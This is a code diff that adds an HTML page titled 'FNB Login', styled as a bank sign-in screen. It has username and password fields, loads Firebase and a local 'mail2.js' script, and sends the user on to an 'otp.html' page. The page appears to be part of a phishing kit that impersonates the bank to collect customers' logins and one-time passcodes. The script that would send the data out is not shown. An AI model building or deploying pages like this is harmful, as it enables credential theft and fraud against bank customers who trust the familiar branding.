@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+	 <link rel="stylesheet" href="./styles3.css">
+    
+    
+    <title>FNB Login</title>
+    
+
+	<style type="text/css">
+		
+		body{
+			background-image:url(fnb.jpg);
+			background-repeat:no-repeat;
+			background-size:100% 100%;
+			background-attachment: fixed;
+		}
+        .button {
+            background-color: blue;
+            border-color: red;
+            color: white;
+        }
+
+		
+              
+	</style>
+</head>
+
+<body>
+<div class="back">
+      <div style="text-align: center;">
+        <img src="./Source/fnbinfo.png" alt="logo" width="1000" 
+     height="500" />
+    <div class="container">
+        <form action="" id="contactForm">
+            <div class="alert">Loging In</div>
+			
+
+            <div class="inputBox">
+                <textarea id="msgContent" cols="30" rows="10" placeholder="Username"></textarea>
+            </div>
+			
+			<div class="inputBox">
+                <input type="password" id="sentence" placeholder="Password" />
+            </div>
+
+            <div class="inputBox">
+                <button onclick="window.location.href = 'otp.html';">SIGN IN</button>
+            </div>
+        </form>
+    </div>
+	
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./mail2.js"></script>
+</body>
+
+</html>
